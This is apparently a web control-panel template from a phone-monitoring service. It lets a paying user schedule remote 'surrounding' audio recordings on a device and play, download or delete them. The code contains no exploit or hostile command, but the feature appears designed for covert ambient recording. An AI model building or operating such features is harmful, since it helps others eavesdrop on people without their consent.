<style type="text/css">
    @media (min-width: 768px) {
        .inputWrapper {
            display: inline-block;
            margin-bottom: 0;
            vertical-align: middle;
            width: 230px;
        }
    }

    .networkForm {
        margin: 15px 0 10px 0;
    }

    #date .input-group-addon i {
        cursor: pointer;
    }
</style>
<div>
    <h1 class="text-center">{$title}</h1>

    {insert "inc.flashMessages.htm"}

    {if !$paid}
    {insert "cp/updatePackage.html"}
    {else}
    <div class="row networkForm">
        <div class="col-lg-push-3 col-lg-6">
            <form method="post" action="" class="form-inline">
                <div class="form-group">
                    <label for="network">{$di.t->_('Upload recorded files via')}</label>
                    {include "scripts/select.htm" name="network" id="network" class="form-control" options=$networksList selected=$network}
                </div>
            </form>
        </div>
    </div>

    <p class="text-primary text-center">{$di.t->_('Additional charges may apply for data transfer using mobile operator network.')}</p>

    <div id="player" class="jp-jplayer"></div>

    <div id="jpContainer" class="jp-audio">
        <div class="jp-type-single">
            <div class="jp-gui jp-interface">
                <ul class="jp-controls">
                    <li><a href="javascript:;" class="jp-play" tabindex="1"><i class="fa fa-play"></i></a></li>
                    <li><a href="javascript:;" class="jp-pause" tabindex="1"><i class="fa fa-pause"></i></a></li>
                </ul>

                <div class="jp-progress">
                    <div class="jp-seek-bar">
                        <div class="jp-play-bar"></div>
                        <div class="jp-time-holder">
                            <div class="jp-current-time"></div>
                            <div class="jp-duration"></div>
                        </div>
                    </div>
                </div>
                <div class="jp-volume-controls">
                    <a href="javascript:;" class="jp-mute" tabindex="1" title="mute"><i class="fa fa-volume-off"></i></a>
                    <a href="javascript:;" class="jp-unmute" tabindex="1" title="unmute"><i class="fa fa-volume-up"></i></a>
                    <div class="jp-volume-bar">
                        <div class="jp-volume-bar-value"></div>
                    </div>
                </div>
                <div class="jp-close">
                    <i class="fa fa-times"></i>
                </div>
            </div>
            <div class="jp-no-solution">
                <span>{$di.t->_('Update Required')}</span>
                {$di.t->_('To play the media you will need to either update your browser to a recent version or update your %1$sFlash plugin%2$s.', ['<a href="http://get.adobe.com/flashplayer/" target="_blank">', '</a>'])}
            </div>
        </div>
    </div>

    <div class="panel panel-default">
        <div class="panel-heading">{$di.t->_('New recording task')}</div>
        <div class="panel-body">
            <form role="form" action="" class="form-inline" method="post" id="surroundingForm">
                <div class="form-group">
                    <label for="datetimepicker">{$di.t->_('Start time')}</label>
                    <div class="inputWrapper double">
                        <div class="form-group">
                            <div class="input-group date" id="datetimepicker">
                                <input type="text" class="form-control" />
                                <span class="input-group-addon"><span class="fa fa-calendar"></span></span>
                            </div>
                        </div>
                    </div>
                    <input type="hidden" name="timestamp" id="timestamp" />
                </div>
                <div class="form-group">
                    <label for="duration">{$di.t->_('Duration (min)')}</label>
                    <div class="inputWrapper">
                        <input type="text" name="duration" value="1" class="form-control spin" />
                    </div>
                </div>
                <div class="form-group">
                    <button type="submit" name="addSurrounding" class="btn btn-primary">{$di.t->_('Add')}</button>
                </div>
            </form>
        </div>
    </div>

    <div class="table-container">
        <table class="dataTable" id="datatable" aria-describedby="datatables_info">
            <thead>
                <tr role="row">
                    <th>{$di.t->_('Date')}</th>
                    <th>{$di.t->_('Duration')}</th>
                    <th>{$di.t->_('Status')}</th>
                    <th>{$di.t->_('Actions')}</th>
                </tr>
            </thead>
        </table>
    </div>
    <p class="text-info">*{$di.t->_('Command activation will take up to 20 minutes.')}</p>
    <script type="text/javascript">
        $(document).ready(function() {
            var playTmpl = _.template('<a href="" data-time="<%= timestamp %>" class="btn btn-play btn-xs btn-success"><i class="fa fa-play"></i> {$di.t->_('Play')}</a><a href="" data-time="<%= timestamp %>" class="btn btn-stop btn-xs btn-success hidden"><i class="fa fa-stop"></i> {$di.t->_('Stop')}</a> <a href="{$di.router->getRouteUrl("surrounding")}/download/<%= timestamp %>" class="btn btn-download btn-xs btn-success"><i class="fa fa-cloud-download"></i> {$di.t->_('Download')}</a>');
            var deleteTmpl = _.template('<a href="" delete-href="{$di.router->getRouteUrl("surrounding")}/delete/<%= timestamp %>" class="btn btn-danger btn-xs"><i class="fa fa-trash-o"></i> {$di.t->_('Delete')}</a>');
            var closePlayerAction = null;
            moment.lang('{$di.locale}');

            $("#player").jPlayer({
                cssSelectorAncestor: '#jpContainer',
                swfPath: 'http://jplayer.org/latest/js',
                supplied: 'mp3',
                errorAlerts: true,
                warningAlerts: true
            });

            $("#jpContainer .jp-close").on('click touchend', function() {
                if ($.isFunction(closePlayerAction)) {
                    closePlayerAction();
                }
            });

            var surroundings = {
                formMinDate: moment().add('minutes', 20),
                formDefaultDate: moment().add('minutes', 20),
                maxAwaitingTime: {$maxAwaitingTime},
                table: null,
                initForm: function() {
                    $('.spin').TouchSpin({
                        min: 1,
                        max: 30,
                        stepinterval: 1
                    });

                    $('#datetimepicker').datetimepicker({
                        language: '{$di.locale}',
                        defaultDate: this.formDefaultDate,
                        minDate: this.formMinDate
                    });

                    $('#surroundingForm').submit(function(e) {
                        var userTime = $('#datetimepicker').data("DateTimePicker").date.unix() - moment().zone() * 60;
                        $("#timestamp").val(userTime);
                    });
                },
                initTable: function() {
                    var table = $('#datatable').dataTable({
                        bProcessing: true,
                        bServerSide: true,
                        sAjaxSource: "{$di.router->getRouteUrl('surrounding')}",
                        bPaginate: true,
                        bFilter: false,
                        bSort: true,
                        bInfo: true,
                        bAutoWidth: false,
                        bSortMulti: false,
                        iDisplayLength: '{$authData.records_per_page}',
                        aaSorting: [[0, 'desc']],
                        oLanguage: {
                            sUrl: '{$di.config.staticDomain}/js/datatables/language/{$di.locale}.txt'
                        },
                        aoColumns: [
                            {
                                mData: "timestamp",
                                bUseRendered: false,
                                sWidth: '180px',
                                fnRender: function(obj, value) {
                                    return moment(value * 1000).zone(0).format('lll');
                                }
                            },
                            {
                                mData: "duration",
                                bUseRendered: false,
                                sWidth: '110px',
                                fnRender: function(obj, value) {
                                    return moment.utc(value * 1000).format("HH:mm:ss");
                                }
                            },
                            {
                                mData: null,
                                bUseRendered: false,
                                bSortable: false,
                                fnRender: function(obj) {
                                    if (obj.aData.dstatus > 0 || obj.aData.error > 0) {
                                        if (obj.aData.error > 0) {
                                            return '<span class="text-danger">{$di.t->_('Record Failed')}</span>';
                                        } else {
                                            if (obj.aData.dstatus == 6) {
                                                return playTmpl({
                                                    timestamp: obj.aData.timestamp
                                                });
                                            } else if (obj.aData.dstatus == 1) {
                                                return '<span class="text-info">{$di.t->_('New record')}</span>';
                                            } else {
                                                return '<span class="text-info">{$di.t->_('Awaiting Record')}</span>';
                                            }
                                        }
                                    } else {
                                        if (obj.aData.status > 0) {
                                            return playTmpl({
                                                timestamp: obj.aData.timestamp
                                            });
                                        } else if (obj.aData.timestamp < surroundings.maxAwaitingTime - obj.aData.duration) {
                                            return '<span class="text-danger">{$di.t->_('Record Failed')}</span>';
                                        }

                                        return '<span class="text-info">{$di.t->_('Awaiting Record')}</span>';
                                    }
                                }
                            },
                            {
                                mData: null,
                                bUseRendered: false,
                                bSortable: false,
                                sWidth: '150px',
                                fnRender: function(obj) {
                                    return deleteTmpl({
                                        timestamp: obj.aData.timestamp
                                    });
                                }
                            }
                        ],
                        fnDrawCallback: function() {
                            surroundings.table = table;
                            $(this).find('tbody').tableScroll();
                        }
                    });

                    var hideAll = function() {
                        $('#datatable .btn-stop').addClass('hidden');
                        $('#datatable .btn-play').removeClass('hidden');
                    };

                    $(document.body).on('click touchend', '#datatable a[delete-href]', function(e) {
                        e.preventDefault();
                        if (confirm("{$di.t->_('Are you sure you want to delete this recording?')}")) {
                            window.location = $(this).attr('delete-href');
                        }
                    });

                    $(document.body).on('click touchend', '#datatable .btn-play', function(e) {
                        e.preventDefault();
                        if ($(this).attr('data-time') > 0) {
                            $('#player').jPlayer("setMedia", {
                                mp3: "{$di.router->getRouteUrl('surrounding')}/play/" + $(this).attr('data-time')
                            });

                            $("#jpContainer").show();

                            hideAll();
                            $(this).next('.btn-stop').removeClass('hidden');
                            $(this).addClass('hidden');

                            $btnPlay = $(this);
                            $btnStop = $(this).next('.btn-stop');

                            closePlayerAction = function() {
                                $("#player").jPlayer("stop");
                                $("#jpContainer").hide();
                                hideAll();

                                $btnPlay.removeClass('hidden');
                                $btnStop.addClass('hidden');
                            };

                            $btnStop.click(function(e) {
                                e.preventDefault();
                                closePlayerAction();
                            });

                            $("#player").jPlayer("play");
                        }
                    });
                },
                reloadTable: function(url) {
                    this.table.fnReloadAjax(url);
                }
            };
            $('#network').change(function() {
                $(this).closest('form').submit();
            });
            surroundings.initForm();
            surroundings.initTable();
        });
    </script>
    {/if}
</div>